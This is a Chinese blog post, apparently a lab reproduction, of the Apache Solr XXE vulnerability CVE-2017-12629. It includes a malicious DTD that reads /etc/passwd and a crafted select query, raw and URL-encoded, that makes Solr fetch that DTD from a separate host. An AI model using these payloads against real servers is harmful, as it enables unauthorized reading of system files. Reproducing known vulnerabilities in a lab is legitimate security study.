# Apache solr XML 实体注入漏洞（CVE-2017-12629）



# 漏洞描述

**Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。原理大致是文档通过Http利用XML加到一个搜索集合中。查询该集合也是通过 http收到一个XML/JSON响应来实现。此次7.1.0之前版本总共爆出两个漏洞：XML实体扩展漏洞（XXE）和远程命令执行漏洞（RCE），二者可以连接成利用链，编号均为CVE-2017-12629。**



# 影响范围

```
Apache Solr < 7.1
Apache Lucene < 7.1（很多组件都用到这个，比如ES）
```





# 漏洞复现

**自己创建一个可以访问的web站点(公网内网均可)，放置dtd文件（里面写执行的代码），然后用solr去包含这个dtd站点路径，就会自动读取dtd文件中的文件路径，类似文件包含**



**构造dtd文件站点，使用phpstudy**

**创建.dtd文件，文件内容如下（可自行构造命令）**

```xml-dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % ent "<!ENTITY data SYSTEM ':%file;'>">
```

![img](https://img-blog.csdnimg.cn/20201122172850497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5MTU2NjcwNzY1MjY=,size_16,color_FFFFFF,t_70#pic_center)

**访问solr服务，触发我们的dtd文件，浏览器输入如下payload，里面的IP和文件名称根据实际情况修改，我的solr是192.168.239.170，文件名称是1.dtd**

**使用编码命令**

```
GET
/solr/demo/select?&q=<?xml+version="1.0"+?><!DOCTYPE+root[<!ENTITY+%+ext+SYSTEM+“http://ip/do.dtd”>%ext;%ent;]>&data;&wt=xml&defType=xmlparser

```

**编码成**

```
http://192.168.153.128:8983/solr/demo/select?&q=%3C%3fxml+version%3d%221.0%22+%3f%3E%3C!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22http%3a%2f%2f10.10.10.101%2f1.dtd%22%3E%25ext%3b%25ent%3b%5d%3E%3Cr%3E%26data%3b%3C%2fr%3E&wt=xml&defType=xmlparser
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201122172912573.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5MTU2NjcwNzY1MjY=,size_16,color_FFFFFF,t_70#pic_center)

**成功读取passwd**